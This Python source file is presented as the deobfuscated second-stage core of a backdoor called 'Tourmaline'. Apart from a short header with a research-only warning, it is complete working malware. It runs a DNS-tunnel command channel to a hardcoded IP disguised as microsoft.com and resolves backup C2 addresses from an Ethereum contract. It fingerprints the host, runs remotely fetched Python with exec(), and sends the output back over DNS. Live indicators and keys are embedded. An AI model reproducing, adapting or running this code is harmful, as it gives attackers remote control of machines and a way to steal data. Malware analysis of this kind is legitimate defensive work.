# =============================================================================
# stage2_backdoor.py — Tourmaline Stage 2: Deobfuscated Core Backdoor
# =============================================================================
# SOURCE: Decrypted from QGBdu.dxf using the O(1) XOR key recovery
#         (key = 00dd6c54 + 2b0cffe07b06ac25793b3f00cfaa2dd5881c2d6378165247539dbbdaeb).
#         XOR string literals subsequently deobfuscated via AST transformation.
#
# ARCHITECTURE:
#   • ChaCha20 encryption  — custom implementation, no library dependency
#   • DNS tunnel C2        — raw UDP packets to 158.94.211.185:53 spoofing microsoft.com
#   • Blockchain dead-drop — Ethereum Sepolia contract 0x2d7a04cca0c34005f58393f30ac725e25f19e5f5
#                            resolves to active C2 IP (live-verified during analysis)
#   • ECDSA verification   — P-256 signature check on all incoming tasks
#   • Arbitrary exec       — fetched Python tasks exec()'d in persistent namespace
#
# KEY INTERNAL FUNCTIONS:
#   _mc()    — build config dict (all strings deobfuscated from XOR literals)
#   _bres()  — blockchain dead-drop resolver (eth_call → ChaCha20 decrypt → IP)
#   _dbq()   — raw DNS query builder
#   _qtxt()  — send/recv DNS tunnel query
#   _xpy()   — arbitrary Python exec engine with output capture
#   _run()   — main polling loop
#   main()   — entry point
#
# WARNING: This is deobfuscated malware code for research analysis only.
#          Do NOT execute. All function/variable names are as-found in the binary.
# =============================================================================
g1 = lambda l6, m6: l6 & m6
h1 = lambda n6, o6: n6 << o6
i1 = lambda p6, q6: p6 >> q6
j1 = lambda r6, s6: r6 | s6
k1 = lambda t6, u6: t6 + u6
z1 = lambda v6, w6: v6 ^ w6
g2 = lambda x6, y6: x6 % y6
g3 = lambda z6, a7: z6 * a7
v5 = lambda b7, c7: b7 - c7
f3 = lambda d7: not d7
u5 = lambda e7: -e7
f = __import__(b'__future__'.decode(), globals(), locals(), [b'annotations'.decode()], 0)
annotations = f.annotations
argparse = __import__(b'argparse'.decode(), globals(), locals(), [], 0)
atexit = __import__(b'atexit'.decode(), globals(), locals(), [], 0)
base64 = __import__(b'base64'.decode(), globals(), locals(), [], 0)
ctypes = __import__(b'ctypes'.decode(), globals(), locals(), [], 0)
wt = __import__(b'ctypes'.decode(), globals(), locals(), [b'wintypes'.decode()], 0).wintypes
getpass = __import__(b'getpass'.decode(), globals(), locals(), [], 0)
hashlib = __import__(b'hashlib'.decode(), globals(), locals(), [], 0)
json = __import__(b'json'.decode(), globals(), locals(), [], 0)
os = __import__(b'os'.decode(), globals(), locals(), [], 0)
platform = __import__(b'platform'.decode(), globals(), locals(), [], 0)
random = __import__(b'random'.decode(), globals(), locals(), [], 0)
socket = __import__(b'socket'.decode(), globals(), locals(), [], 0)
struct = __import__(b'struct'.decode(), globals(), locals(), [], 0)
sys = __import__(b'sys'.decode(), globals(), locals(), [], 0)
tempfile = __import__(b'tempfile'.decode(), globals(), locals(), [], 0)
threading = __import__(b'threading'.decode(), globals(), locals(), [], 0)
time = __import__(b'time'.decode(), globals(), locals(), [], 0)
j = __import__(b'urllib.request'.decode(), globals(), locals(), [], 0)
urllib = __import__(b'urllib'.decode(), globals(), locals(), [], 0)
uuid = __import__(b'uuid'.decode(), globals(), locals(), [], 0)
l = __import__(b'pathlib'.decode(), globals(), locals(), [b'Path'.decode()], 0)
Path = l.Path
sb0lztbn = b'f5fc93fae24f36da364cec4801a1576b'.decode()
vul31gmy = [b'158.94.211.185'.decode()]
g728saev = b'MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEt17l3rGHHR9sYdHEvV8S+JRRCUHQQveSadlGk04xM/8WClDf/67Tyritt2+T18SY8n0xv1TKKl0AgnNFuboEEQ=='.decode()
ialydi2n = b'6434d5b9f55d'.decode()
z8xm1zdh = b'4027c65935c212ad'.decode()
slels2e9 = b'2.63.519'.decode()
k3vg20qf = 53
qszx6md1 = b'Tourmaline'.decode()
nifqxw9o = b'TourmalineUpdate'.decode()
fwkafy9n = b'0x2d7a04cca0c34005f58393f30ac725e25f19e5f5'.decode()
u7enddoi = b'36f555c87f71581f57d83576c88193fdc00a0173f741a3e198e2d7abdc9cda59'.decode()
d0l651ri = [b'https://rpc.sepolia.org'.decode(), b'https://ethereum-sepolia-rpc.publicnode.com'.decode(), b'https://sepolia.drpc.org'.decode(), b'https://eth-sepolia.public.blastapi.io'.decode(), b'https://rpc2.sepolia.org'.decode()]
mzgh5ucp = b'eb9fd6fe'.decode()
qsa4_935 = 190
kg90kp8_ = 133
u15k9cei = 1
_shy9_ir = 150
d3hxxf2s = 130
_ml5r24d = 53
bfah40qv = 191
q25_scc4 = b'20b29633'.decode()
e6tljywf = b'Hardware monitoring service'.decode()
vu38mwxg = b'PT2M'.decode()
kewo1cxs = b'2021-07-13T08:54:00'.decode()

def miinmggozb():
    u = __import__(b'base64'.decode(), globals(), locals(), [], 0)
    m = __import__(b'hashlib'.decode(), globals(), locals(), [], 0)
    return _mc(th=sb0lztbn, il=vul31gmy, ep=getattr(u, b'b64decode'.decode())(g728saev) if g728saev else b'', ti=ialydi2n, tz=z8xm1zdh or getattr(getattr(m, b'sha256'.decode())(getattr(bytes, b'fromhex'.decode())(sb0lztbn)), b'hexdigest'.decode())()[:16], vr=slels2e9, dp=k3vg20qf, ca=fwkafy9n, ck=getattr(bytes, b'fromhex'.decode())(u7enddoi) if u7enddoi else b'', re=d0l651ri, gs=mzgh5ucp, an=qszx6md1, tn=nifqxw9o, oc=qsa4_935, op=kg90kp8_, oi=u15k9cei, ok=_shy9_ir, oo=d3hxxf2s, oe=_ml5r24d, or_=bfah40qv, bm=q25_scc4, td=e6tljywf, ti_=vu38mwxg, ts=kewo1cxs)
_N = b'SystemService'.decode()
_V = b'1.0.0'.decode()
_RT = {b'min'.decode(): 15 / 1, b'max'.decode(): 30 / 1}
_CT = 4096
_D = b'microsoft.com'.decode()
_CS = 3000

def _pdd():
    try:
        x = getattr(getattr(os, b'path'.decode()), b'abspath'.decode())(getattr(sys, b'argv'.decode())[0]) if getattr(sys, b'argv'.decode())[0] else __file__
        y = getattr(getattr(Path(x), b'resolve'.decode())(), b'parent'.decode())
        if getattr(y, b'exists'.decode())():
            return y
    except:
        pass
    return Path(getattr(getattr(os, b'environ'.decode()), b'get'.decode())(b'ProgramData'.decode(), b'C:\\ProgramData'.decode())) / _N

def _sr(z=None):
    a1 = getattr(random, b'uniform'.decode())(_RT[b'min'.decode()], _RT[b'max'.decode()])
    if z is None:
        getattr(time, b'sleep'.decode())(a1)
    else:
        getattr(z, b'wait'.decode())(a1)

def _cqr(b1, d1, e1, f1, c1):
    b1[d1] = g1(b1[d1] + b1[e1], 4294967295)
    b1[c1] ^= b1[d1]
    b1[c1] = j1(h1(b1[c1], 16), i1(b1[c1], 16)) & 4294967295
    b1[f1] = g1(k1(b1[f1], b1[c1]), 4294967295)
    b1[e1] ^= b1[f1]
    b1[e1] = g1(j1(h1(b1[e1], 12), i1(b1[e1], 20)), 4294967295)
    b1[d1] = g1(k1(b1[d1], b1[e1]), 4294967295)
    b1[c1] ^= b1[d1]
    b1[c1] = (h1(b1[c1], 8) | i1(b1[c1], 24)) & 4294967295
    b1[f1] = g1(b1[f1] + b1[c1], 4294967295)
    b1[e1] ^= b1[f1]
    b1[e1] = g1(h1(b1[e1], 7) | i1(b1[e1], 25), 4294967295)

def _cblk(l1, n1, p1):
    q1 = [1634760805, 857760878, 2036477234, 1797285236, *getattr(struct, b'unpack'.decode())(b'<8I'.decode(), l1), g1(n1, 4294967295), *getattr(struct, b'unpack'.decode())(b'<3I'.decode(), p1)]
    m1 = list(q1)
    for o1 in range(10):
        _cqr(m1, 0, 4, 8, 12)
        _cqr(m1, 1, 5, 9, 13)
        _cqr(m1, 2, 6, 10, 14)
        _cqr(m1, 3, 7, 11, 15)
        _cqr(m1, 0, 5, 10, 15)
        _cqr(m1, 1, 6, 11, 12)
        _cqr(m1, 2, 7, 8, 13)
        _cqr(m1, 3, 4, 9, 14)
    return getattr(b'', b'join'.decode())((getattr(struct, b'pack'.decode())(b'<I'.decode(), k1(m1[i], q1[i]) & 4294967295) for i in range(16)))

def _cc(r1, v1, data):
    x1 = bytearray()
    for y1 in range((len(data) + 63) // 64):
        w1 = _cblk(r1, y1, v1)
        s1 = y1 * 64
        u1 = min(k1(s1, 64), len(data))
        for t1 in range(s1, u1):
            getattr(x1, b'append'.decode())(z1(data[t1], w1[t1 - s1]))
    return bytes(x1)

def _dop(a2):
    b2 = getattr(random, b'randint'.decode())(1, 255)
    return f'{z1(a2, b2):02x}{b2:02x}'

def _xc(data, c2):
    e2 = bytearray(len(data))
    f2 = len(c2)
    for d2 in range(len(data)):
        e2[d2] = data[d2] ^ c2[g2(d2, f2)]
    return bytes(e2)

def _bres(ca, ck, n2, gs=b'3bc5de30'.decode()):
    for q2 in n2:
        try:
            o2 = getattr(getattr(json, b'dumps'.decode())({b'jsonrpc'.decode(): b'2.0'.decode(), b'id'.decode(): 1, b'method'.decode(): b'eth_call'.decode(), b'params'.decode(): [{b'to'.decode(): ca, b'data'.decode(): b'0x'.decode() + gs}, b'latest'.decode()]}), b'encode'.decode())()
            p2 = getattr(getattr(urllib, b'request'.decode()), b'Request'.decode())(q2, data=o2, headers={b'Content-Type'.decode(): b'application/json'.decode()})
            with getattr(getattr(urllib, b'request'.decode()), b'urlopen'.decode())(p2, timeout=10) as k2:
                l2 = getattr(json, b'loads'.decode())(getattr(k2, b'read'.decode())())
            h2 = l2[b'result'.decode()]
            if getattr(h2, b'startswith'.decode())(b'0x'.decode()) or getattr(h2, b'startswith'.decode())(b'0X'.decode()):
                h2 = h2[2:]
            r2 = getattr(bytes, b'fromhex'.decode())(h2)
            if len(r2) < 64:
                continue
            i2 = getattr(int, b'from_bytes'.decode())(r2[:32], b'big'.decode())
            m2 = getattr(int, b'from_bytes'.decode())(r2[i2:k1(i2, 32)], b'big'.decode())
            j2 = r2[k1(i2, 32):k1(i2 + 32, m2)]
            if len(j2) < 13:
                continue
            return getattr(_cc(ck, j2[:12], j2[12:]), b'decode'.decode())(b'utf-8'.decode())
        except:
            pass
    return None

def _mc(th, il, ep, ti, tz, vr, u2=_D, t2=b'', ca='', ck=b'', dp=53, re=None, gs=b'3bc5de30'.decode(), s2=None, an=_N, tn=b'SystemUpdate'.decode(), oc=16, op=32, oi=48, ok=64, oo=80, oe=96, or_=112, bm=b'524c4358'.decode(), td=b'System maintenance'.decode(), ti_=b'PT1M'.decode(), ts=b'2020-01-01T00:00:00'.decode()):
    return {b'th'.decode(): th, b'il'.decode(): il, b'ep'.decode(): ep, b'ti'.decode(): ti, b'tz'.decode(): tz, b'vr'.decode(): vr, b'rz'.decode(): u2, b'mg'.decode(): t2, b'ca'.decode(): ca, b'ck'.decode(): ck, b'dp'.decode(): dp, b're'.decode(): re or [], b'gs'.decode(): gs, b'ex'.decode(): s2 or {}, b'an'.decode(): an, b'tn'.decode(): tn, b'oc'.decode(): oc, b'op'.decode(): op, b'oi'.decode(): oi, b'ok'.decode(): ok, b'oo'.decode(): oo, b'oe'.decode(): oe, b'or'.decode(): or_, b'bm'.decode(): bm, b'td'.decode(): td, b'ti_'.decode(): ti_, b'ts'.decode(): ts, b'chk'.decode(): getattr(getattr(hashlib, b'sha256'.decode())(getattr(bytes, b'fromhex'.decode())(th)), b'digest'.decode())()}

def _lc():
    return miinmggozb()

def _rmg():
    try:
        x2 = __import__(b'winreg'.decode(), globals(), locals(), [], 0)
        with getattr(x2, b'OpenKey'.decode())(getattr(x2, b'HKEY_LOCAL_MACHINE'.decode()), b'SOFTWARE\\Microsoft\\Cryptography'.decode(), 0, getattr(x2, b'KEY_READ'.decode()) | getattr(x2, b'KEY_WOW64_64KEY'.decode())) as y2:
            w2, v2 = getattr(x2, b'QueryValueEx'.decode())(y2, b'MachineGuid'.decode())
            return str(w2)
    except:
        return f'machine-{getattr(uuid, 'getnode')():012x}'

def _rus():
    try:
        c3 = getattr(getattr(ctypes, b'windll'.decode()), b'advapi32'.decode())
        z2 = getattr(wt, b'HANDLE'.decode())()
        if f3(getattr(getattr(getattr(ctypes, b'windll'.decode()), b'kernel32'.decode()), b'OpenProcessToken'.decode())(getattr(getattr(getattr(ctypes, b'windll'.decode()), b'kernel32'.decode()), b'GetCurrentProcess'.decode())(), 8, getattr(ctypes, b'byref'.decode())(z2))):
            raise OSError
        try:
            a3 = getattr(wt, b'DWORD'.decode())(0)
            getattr(c3, b'GetTokenInformation'.decode())(z2, 1, None, 0, getattr(ctypes, b'byref'.decode())(a3))
            e3 = g3(getattr(ctypes, b'c_byte'.decode()), getattr(a3, b'value'.decode()))()
            if f3(getattr(c3, b'GetTokenInformation'.decode())(z2, 1, e3, a3, getattr(ctypes, b'byref'.decode())(a3))):
                raise OSError
            b3 = getattr(ctypes, b'cast'.decode())(e3, getattr(ctypes, b'POINTER'.decode())(getattr(ctypes, b'c_void_p'.decode())))[0]
            d3 = getattr(ctypes, b'c_wchar_p'.decode())()
            if f3(getattr(c3, b'ConvertSidToStringSidW'.decode())(b3, getattr(ctypes, b'byref'.decode())(d3))):
                raise OSError
            try:
                return str(getattr(d3, b'value'.decode()))
            finally:
                getattr(getattr(getattr(ctypes, b'windll'.decode()), b'kernel32'.decode()), b'LocalFree'.decode())(d3)
        finally:
            getattr(getattr(getattr(ctypes, b'windll'.decode()), b'kernel32'.decode()), b'CloseHandle'.decode())(z2)
    except:
        return f'S-1-fallback-{getattr(os, 'getpid')()}-{getattr(getpass, 'getuser')()}'

def _rdm():
    try:
        j3 = getattr(socket, b'getfqdn'.decode())()
        i3 = getattr(socket, b'gethostname'.decode())()
        if j3 and getattr(j3, b'lower'.decode())() != getattr(i3, b'lower'.decode())():
            h3 = getattr(j3, b'find'.decode())(b'.'.decode())
            if h3 > 0:
                return j3[k1(h3, 1):]
    except:
        pass
    return getattr(getattr(os, b'environ'.decode()), b'get'.decode())(b'USERDOMAIN'.decode(), '') or ''

def _mid():
    l3 = _rmg()
    k3 = _rus()
    return {b'mg'.decode(): l3, b'us'.decode(): k3, b'un'.decode(): getattr(getpass, b'getuser'.decode())(), b'hn'.decode(): getattr(socket, b'gethostname'.decode())(), b'dm'.decode(): _rdm(), b'mn'.decode(): k1(k1(b'Global\\'.decode(), _N) + b'_'.decode(), getattr(getattr(hashlib, b'sha256'.decode())(getattr(f'{l3}|{k3}', b'encode'.decode())()), b'hexdigest'.decode())()[:16])}

def _macq(p3):
    m3 = getattr(getattr(ctypes, b'windll'.decode()), b'kernel32'.decode())
    getattr(m3, b'CreateMutexW'.decode()).argtypes = [getattr(ctypes, b'c_void_p'.decode()), getattr(wt, b'BOOL'.decode()), getattr(wt, b'LPCWSTR'.decode())]
    getattr(m3, b'CreateMutexW'.decode()).restype = getattr(wt, b'HANDLE'.decode())
    getattr(m3, b'GetLastError'.decode()).restype = getattr(wt, b'DWORD'.decode())
    getattr(m3, b'SetLastError'.decode()).argtypes = [getattr(wt, b'DWORD'.decode())]
    getattr(m3, b'CloseHandle'.decode()).argtypes = [getattr(wt, b'HANDLE'.decode())]
    getattr(m3, b'CloseHandle'.decode()).restype = getattr(wt, b'BOOL'.decode())
    getattr(m3, b'SetLastError'.decode())(0)
    o3 = getattr(m3, b'CreateMutexW'.decode())(None, 4 == 0, p3)
    n3 = getattr(m3, b'GetLastError'.decode())()
    if not o3:
        return None
    if n3 == 183:
        getattr(m3, b'CloseHandle'.decode())(o3)
        return None
    return o3

def _mrel(q3):
    if q3:
        try:
            getattr(getattr(getattr(ctypes, b'windll'.decode()), b'kernel32'.decode()), b'CloseHandle'.decode())(q3)
        except:
            pass

def _dbq(g4, l4, c4, e4, f4):
    for t3 in g4:
        m4 = getattr(random, b'randint'.decode())(1, 65535)
        d4 = getattr(struct, b'pack'.decode())(b'!HHHHHH'.decode(), m4, 256, 1, 0, 0, 0)
        w3 = b''
        for x3 in getattr(e4, b'split'.decode())(b'.'.decode()):
            k4 = getattr(x3, b'encode'.decode())(b'ascii'.decode())
            while len(k4) > 63:
                w3 = k1(w3, k1(bytes([63]), k4[:63]))
                k4 = k4[63:]
            w3 = w3 + (bytes([len(k4)]) + k4)
        w3 = w3 + (b'\x00' + getattr(struct, b'pack'.decode())(b'!HH'.decode(), f4, 1))
        u3 = k1(d4, w3)
        z3 = getattr(socket, b'socket'.decode())(getattr(socket, b'AF_INET'.decode()), getattr(socket, b'SOCK_DGRAM'.decode()))
        getattr(z3, b'settimeout'.decode())(c4)
        try:
            getattr(z3, b'sendto'.decode())(u3, (t3, l4))
            r3, b4 = getattr(z3, b'recvfrom'.decode())(65535)
            if len(r3) < 12:
                continue
            if getattr(struct, b'unpack'.decode())(b'!H'.decode(), r3[0:2])[0] != m4:
                continue
            v3 = getattr(struct, b'unpack'.decode())(b'!H'.decode(), r3[6:8])[0]
            if v3 == 0:
                continue
            i4 = 12
            while i4 < len(r3) and r3[i4] != 0:
                if r3[i4] & 192 == 192:
                    i4 = k1(i4, 2)
                    break
                i4 = i4 + (1 + r3[i4])
            else:
                i4 = k1(i4, 1)
            i4 = k1(i4, 4)
            while i4 < len(r3):
                if g1(r3[i4], 192) == 192:
                    i4 = k1(i4, 2)
                else:
                    while i4 < len(r3) and r3[i4] != 0:
                        i4 = k1(i4, 1 + r3[i4])
                    i4 = i4 + 1
                if i4 + 10 > len(r3):
                    break
                s3 = getattr(struct, b'unpack'.decode())(b'!H'.decode(), r3[i4:i4 + 2])[0]
                j4 = getattr(struct, b'unpack'.decode())(b'!H'.decode(), r3[i4 + 8:k1(i4, 10)])[0]
                i4 = i4 + 10
                if f4 == 1 and s3 == 1 and (j4 == 4):
                    return f'{r3[i4]}.{r3[k1(i4, 1)]}.{r3[k1(i4, 2)]}.{r3[k1(i4, 3)]}'
                if f4 == 16 and s3 == 16:
                    y3 = []
                    h4 = k1(i4, j4)
                    while i4 < h4:
                        a4 = r3[i4]
                        i4 = k1(i4, 1)
                        getattr(y3, b'append'.decode())(getattr(r3[i4:i4 + a4], b'decode'.decode())(b'utf-8'.decode(), errors=b'replace'.decode()))
                        i4 = k1(i4, a4)
                    return getattr('', b'join'.decode())(y3)
                i4 = i4 + j4
        except:
            pass
        finally:
            getattr(z3, b'close'.decode())()
    return None
_cfg = None
_id_ = None
_sid = None
_sk = None
_inf = 1 == 0
_dns = None
_cids = set()
_sr_ = None
_stp = None

def _init(o4, n4):
    global _cfg, _id_, _dns, _stp
    _cfg = o4
    _stp = getattr(threading, b'Event'.decode())()
    _id_ = {b'aid'.decode(): getattr(getattr(hashlib, b'md5'.decode())(getattr(n4[b'mg'.decode()], b'encode'.decode())()), b'hexdigest'.decode())()[:8], b'ts'.decode(): getattr(getattr(hashlib, b'md5'.decode())(getattr(o4[b'th'.decode()], b'encode'.decode())()), b'hexdigest'.decode())()[:4]}
    _dns = {b'ips'.decode(): list(o4[b'il'.decode()]), b'port'.decode(): o4[b'dp'.decode()], b'to'.decode(): 4 / 1}

def _gid():
    return _sid or _id_[b'aid'.decode()]

def _qtxt(p4):
    return _dbq(_dns[b'ips'.decode()], _dns[b'port'.decode()], _dns[b'to'.decode()], f'{p4}.{_D}', 16)

def _checkin():
    global _sid, _sk
    q4 = _qtxt(f'{_dop(_cfg['oc'])}{_id_['aid']}{_id_['ts']}')
    if not q4:
        return (10 == 0, 0)
    r4 = getattr(q4, b'split'.decode())(b':'.decode())
    if len(r4) >= 3 and r4[0] == b'1'.decode():
        _sid = r4[2]
        if len(r4) >= 4 and len(r4[3]) == 64:
            _sk = getattr(bytes, b'fromhex'.decode())(r4[3])
        return (0 == 0, int(r4[1]))
    if len(r4) >= 3 and r4[0] == b'0'.decode() and (r4[2] == b'blocked'.decode()):
        getattr(os, b'_exit'.decode())(0)
    if r4[0] == b'0'.decode():
        return (4 == 0, 0)
    return (10 == 0, 0)

def _sinfo():
    s4 = getattr(b'|'.decode(), b'join'.decode())([getattr(_mid(), b'get'.decode())(b'dm'.decode(), ''), '', f'{getattr(platform, 'system')()} {getattr(platform, 'release')()}', getattr(socket, b'gethostname'.decode())(), _V, _id_[b'ts'.decode()]])
    _qtxt(f'{_dop(_cfg['oi'])}{_gid()}{getattr(getattr(s4, 'encode')(), 'hex')()}')

def _poll():
    x4 = f'{getattr(os, 'getpid')() & 65535:04x}'
    w4 = _qtxt(f'{_dop(_cfg['op'])}{_gid()}{x4}')
    if not w4 or w4 in (b'none'.decode(), b'0'.decode()):
        return []
    if w4 == b'exit'.decode():
        getattr(os, b'_exit'.decode())(0)
    if w4 == b'reauth'.decode():
        global _sid, _sk
        _sid = None
        _sk = None
        return []
    t4 = []
    for v4 in getattr(w4, b'split'.decode())(b','.decode()):
        u4 = getattr(v4, b'split'.decode())(b':'.decode())
        if len(u4) >= 3:
            getattr(t4, b'append'.decode())({b'id'.decode(): u4[0], b'sh'.decode(): u4[1], b'ch'.decode(): int(u4[2])})
    return t4

def _fetch(d5, y4):
    b5 = []
    for z4 in range(1, k1(y4, 1)):
        e5 = _qtxt(f'{_dop(_cfg['ok'])}{_gid()}{d5}{z4:02x}')
        if f3(e5) or e5 == b'ERR'.decode():
            break
        if e5 == b'END'.decode():
            break
        getattr(b5, b'append'.decode())(e5)
        if len(e5) < _CS:
            break
    if not b5:
        return None
    try:
        f5 = getattr(base64, b'b64decode'.decode())(getattr('', b'join'.decode())(b5))
        if _sk:
            c5 = _xc(f5, _sk)
        else:
            c5 = _cc(f5[:32], f5[32:44], f5[44:])
        try:
            a5 = __import__(b'zlib'.decode(), globals(), locals(), [], 0)
            return getattr(getattr(a5, b'decompress'.decode())(c5), b'decode'.decode())(b'utf-8'.decode())
        except:
            return getattr(c5, b'decode'.decode())(b'utf-8'.decode())
    except:
        return None

def _sres(j5, g5, h5):
    i5 = getattr({b'done'.decode(): b'00'.decode(), b'failed'.decode(): b'01'.decode()}, b'get'.decode())(g5, b'01'.decode())
    _qtxt(f'{_dop(_cfg['or'])}{_gid()}{j5}{i5}{g1(abs(h5), 255):02x}')

def _sout(q5, t5, l5=None):
    if l5 is None:
        l5 = _cfg[b'oo'.decode()]
    if f3(t5):
        return
    s5 = getattr(t5[:16384], b'encode'.decode())(b'utf-8'.decode())
    try:
        m5 = __import__(b'zlib'.decode(), globals(), locals(), [], 0)
        r5 = getattr(m5, b'compress'.decode())(s5, 6)
        s5 = r5 if len(r5) < len(s5) else s5
    except:
        pass
    if _sk:
        s5 = _xc(s5, _sk)
    n5 = getattr(getattr(getattr(getattr(getattr(base64, b'b64encode'.decode())(s5), b'decode'.decode())(), b'replace'.decode())(b'+'.decode(), b'~'.decode()), b'replace'.decode())(b'/'.decode(), b'_'.decode()), b'replace'.decode())(b'='.decode(), '')
    for k5 in range(0, len(n5), 200):
        o5 = n5[k5:k1(k5, 200)]
        p5 = f'{k5 // 200 + 1:02x}'
        _qtxt(f'{_dop(l5)}{_gid()}{q5}{p5}{o5}')

def _xpy(content):
    io = __import__(b'io'.decode(), globals(), locals(), [], 0)
    t0 = getattr(time, b'time'.decode())()
    ns = {b'__builtins__'.decode(): __builtins__, b'__agent_cfg__'.decode(): _cfg, b'__g__'.decode(): globals()}
    _so = getattr(io, b'StringIO'.decode())()
    _se = getattr(io, b'StringIO'.decode())()
    _oo, _oe = (getattr(sys, b'stdout'.decode()), getattr(sys, b'stderr'.decode()))
    sys.stdout = _so
    sys.stderr = _se
    try:
        exec(content, ns)
        r = getattr(ns, b'get'.decode())(b'__result__'.decode(), None)
        so = getattr(_so, b'getvalue'.decode())()
        se = getattr(_se, b'getvalue'.decode())()
        if r is None:
            r = {b'st'.decode(): b'done'.decode(), b'ec'.decode(): 0, b'so'.decode(): so, b'se'.decode(): se}
        else:
            if f3(getattr(r, b'get'.decode())(b'so'.decode())):
                r[b'so'.decode()] = so
            if f3(getattr(r, b'get'.decode())(b'se'.decode())):
                r[b'se'.decode()] = se
        r[b'dr'.decode()] = int((getattr(time, b'time'.decode())() - t0) * 1000)
        return r
    except Exception as e:
        so = getattr(_so, b'getvalue'.decode())()
        se = getattr(_se, b'getvalue'.decode())()
        return {b'st'.decode(): b'failed'.decode(), b'ec'.decode(): u5(1), b'so'.decode(): so, b'se'.decode(): k1(se, str(e)), b'dr'.decode(): int(v5(getattr(time, b'time'.decode())(), t0) * 1000)}
    finally:
        sys.stdout = _oo
        sys.stderr = _oe

def _xtask(x5):
    z5 = x5[b'id'.decode()]
    b6 = x5[b'sh'.decode()]
    w5 = x5[b'ch'.decode()]
    if z5 in _cids:
        return
    a6 = _fetch(z5, w5)
    if f3(a6):
        _sres(z5, b'failed'.decode(), -1)
        return
    if b6 == b'python'.decode():
        y5 = _xpy(a6)
    elif _sr_ is not None:
        y5 = getattr(_sr_, b'run'.decode())({b'rt'.decode(): b6, b'sc'.decode(): a6})
    else:
        _sres(z5, b'failed'.decode(), u5(1))
        return
    getattr(_cids, b'add'.decode())(z5)
    if len(_cids) > _CT:
        getattr(_cids, b'clear'.decode())()
    _sout(z5, getattr(y5, b'get'.decode())(b'so'.decode(), ''), _cfg[b'oo'.decode()])
    _sout(z5, getattr(y5, b'get'.decode())(b'se'.decode(), ''), _cfg[b'oe'.decode()])
    _sres(z5, getattr(y5, b'get'.decode())(b'st'.decode(), b'failed'.decode()), getattr(y5, b'get'.decode())(b'ec'.decode(), u5(1)))

def _resbc():
    if not _cfg[b'ca'.decode()] or f3(_cfg[b're'.decode()]) or len(_cfg[b'ck'.decode()]) != 32:
        return
    c6 = _bres(_cfg[b'ca'.decode()], _cfg[b'ck'.decode()], _cfg[b're'.decode()], _cfg[b'gs'.decode()])
    if c6 and c6 not in _cfg[b'il'.decode()]:
        getattr(_cfg[b'il'.decode()], b'insert'.decode())(0, c6)
        _dns[b'ips'.decode()] = list(_cfg[b'il'.decode()])

def _run():
    global _inf
    try:
        _resbc()
    except:
        pass
    while f3(getattr(_stp, b'is_set'.decode())()):
        try:
            d6, e6 = _checkin()
            if f3(d6):
                _sr(_stp)
                continue
            if f3(_inf) or getattr(random, b'random'.decode())() < 3602879701896397 / 72057594037927936:
                try:
                    _sinfo()
                    _inf = 0 == 0
                except:
                    pass
            if e6 > 0:
                for f6 in _poll():
                    try:
                        _xtask(f6)
                    except:
                        pass
            getattr(_stp, b'wait'.decode())(getattr(random, b'uniform'.decode())(1 / 1, 2 / 1) if e6 > 0 else getattr(random, b'uniform'.decode())(6 / 1, 10 / 1))
        except:
            _sr(_stp)

def main():
    global _N
    j6 = getattr(argparse, b'ArgumentParser'.decode())(prog=_N)
    getattr(j6, b'add_argument'.decode())(b'--self-check'.decode(), action=b'store_true'.decode())
    getattr(j6, b'add_argument'.decode())(b'--dump-config'.decode(), action=b'store_true'.decode())
    k6 = getattr(j6, b'parse_args'.decode())()
    h6 = _lc()
    if getattr(k6, b'dump_config'.decode()):
        if not h6:
            getattr(json, b'dumps'.decode())({b'error'.decode(): b'no config'.decode()})
            return 2
        getattr(json, b'dumps'.decode())({b'ti'.decode(): h6[b'ti'.decode()], b'tz'.decode(): h6[b'tz'.decode()], b'rz'.decode(): h6[b'rz'.decode()], b'il'.decode(): h6[b'il'.decode()], b'vr'.decode(): h6[b'vr'.decode()], b'pl'.decode(): len(h6[b'ep'.decode()]), b'ml'.decode(): len(h6[b'mg'.decode()]), b'ca'.decode(): h6[b'ca'.decode()] or b'-'.decode()}, indent=2)
        return 0
    if h6 is None:
        return 2
    _N = h6[b'an'.decode()]
    i6 = _mid()
    g6 = _macq(i6[b'mn'.decode()])
    if g6 is None:
        return 0
    getattr(atexit, b'register'.decode())(_mrel, g6)
    if getattr(k6, b'self_check'.decode()):
        return 0
    _init(h6, i6)
    try:
        _run()
    except KeyboardInterrupt:
        pass
    except:
        return 1
    finally:
        _mrel(g6)
    return 0
if __name__ == b'__main__'.decode():
    getattr(sys, b'exit'.decode())(main())